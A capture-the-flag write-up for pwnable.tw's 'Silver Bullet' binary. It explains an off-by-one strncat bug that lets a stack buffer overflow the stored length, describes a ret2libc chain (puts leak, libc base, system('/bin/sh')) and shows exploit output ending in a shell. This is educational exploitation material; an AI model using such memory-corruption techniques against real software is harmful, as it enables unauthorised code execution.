# Silver Bullet

...Is an interesting pwnable from "pwnable.tw".                           
I decided to post a wp as i found it pretty damn fun.                 
We are given a 32bit binary and a libc.
```console
root@kali:~/CTF/pwnable_tw# checksec ./silver_bullet
[*] '/root/CTF/pwnable_tw/silver_bullet'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
## The binary:
The binary is without PIE and stack canary but with full relro and NX.
                       
You are tasked with fighting a werewolf               
(winning won't get you a shell, it's only a cover story).          
                       
#### You have 4 options:
1. Create a silver bullet by describing it              
2. Powering up your bullet by appending a description              
3. Fight the werewolf                   
4. Quit the app               
                  
## Under the scenes:
The bullet is just a buffer on the stack of length 0x30 which is memset to all zeros.                  
The bullet's 'power' is really just the result of strlen of the buffer.           
It just so happens that the bullet's power is stored on the stack right after the bullet buffer.            
                     
                          
### Creating a bullet:
```console
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :1
Give me your description of bullet :it's a damn nice bullet
Your power is : 23
```
Creating a bullet is filling the buffer of 0x30 length with user input,                     
And updating the length variable that is on the stack next to the bullet buf:           
```nasm
mov     eax, [ebp+bullet_buf]
push    30h
push    eax
call    read_input ; read input to bullet buffer
add     esp, 8
mov     eax, [ebp+bullet_buf]
push    eax
call    strlen ; calculate it's length
add     esp, 4
mov     [ebp+len], eax
...
mov     eax, [ebp+bullet_buf]
mov     edx, [ebp+len]
mov     [eax+30h], edx ; place the length (or 'power' i guess) immediately after the buffer
```
                  
                   
### Power up the bullet:
```console
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :2
Give me your another description of bullet :it's also pink
Your new power is : 37
Enjoy it !
```
                       
Powering up the bullet is merely adding a description with strncat.            
               
The length of the max description to add is calculated such:         
added description length = 0x30 - current_power             
(That is if the power level that is stored on the stack is less then 0x30)           
```nasm
mov     eax, [ebp+bullet_buf]
mov     eax, [eax+30h] ; current power
mov     edx, 30h
sub     edx, eax
mov     eax, edx ; leftover length = 0x30 - current power
push    eax             
lea     eax, [ebp+local_buf]
push    eax
call    read_input ; read an addition description
add     esp, 8
mov     eax, [ebp+bullet_buf]
mov     eax, [eax+30h]
mov     edx, 30h
sub     edx, eax
mov     eax, [ebp+bullet_buf]
push    edx
lea     edx, [ebp+local_buf]
push    edx
push    eax
call    strncat ; append it to the bullet buf
add     esp, 0Ch
lea     eax, [ebp+local_buf]
push    eax
call    strlen ; calculate new 'power'
add     esp, 4
mov     edx, eax
mov     eax, [ebp+bullet_buf]
mov     eax, [eax+30h]
add     eax, edx
mov     [ebp+new_power], eax
push    [ebp+new_power]
push    offset aYourNewPowerIs ; "Your new power is : %u\n"
call    printf
add     esp, 8
mov     eax, [ebp+bullet_buf]
mov     edx, [ebp+new_power]
mov     [eax+30h], edx ; place the new power after the bullet buffer.
```
                
### Fighting the werewolf:
```console
Your choice :3
>----------- Werewolf -----------<
 + NAME : Gin
 + HP : 2147483647
>--------------------------------<
Try to beat it .....
Sorry ... It still alive !!

...

Your choice :3
>----------- Werewolf -----------<
 + NAME : Gin
 + HP : 2147483610
>--------------------------------<
Try to beat it .....
Sorry ... It still alive !!
```
             
Fighting the werewolf is just subtracting your power from the werewolf HP.                  
When the werewolf dies, main returns.                          
## Bug:
There is a subtle off-by-one bug caused by strncat.             
From strncat's man page:              
> "If src contains n or more bytes, strncat() writes n+1 bytes to dest (n from src plus the terminating null byte).
> Therefore,the size of dest must be at least strlen(dest)+n+1"                  
                   
And this is the exact bug in play here. (probably shouldv'e read the man page eh?)         
                 
Because of this, if our appended description and original description, when added, are of exactly 0x30 length, the power/length buffer on the stack after it is overwritten with 0 (terminating null-byte) and allows to add 0x30 more characters, thus corrupting the stack.                
         
## Exploitation:
Because of the NX but no PIE or stack canary the exploit path is relatively clear:           
1.Exploit main, construct a rop chain prints the virtual address of a libc function (I chose puts).         
2.Calculate the libc base, and from there calculate the address of "/bin/sh" inside libc and of the system function.           
3.Call main again, and exploit it once again.              
4.Call system("/bin/sh")              
                
```console
root@kali:~/CTF/pwnable_tw# python3 sploit.py 
[+] Opening connection to chall.pwnable.tw on port 10103: Done
[*] '/root/CTF/pwnable_tw/silver_bullet'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
puts addr: 0xf7582140
libc base: 0xf7523000
[*] Switching to interactive mode
Sorry ... It still alive !!
Give me more power !!
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :>----------- Werewolf -----------<
 + NAME : Gin
 + HP : 1052688107
>--------------------------------<
Try to beat it .....
Oh ! You win !!
$ cd home
$ ls
silver_bullet
$ cd silver_bullet
$ ls
flag
run.sh
silver_bullet
$ cat flag
FLAG{*REDACTED*}
```
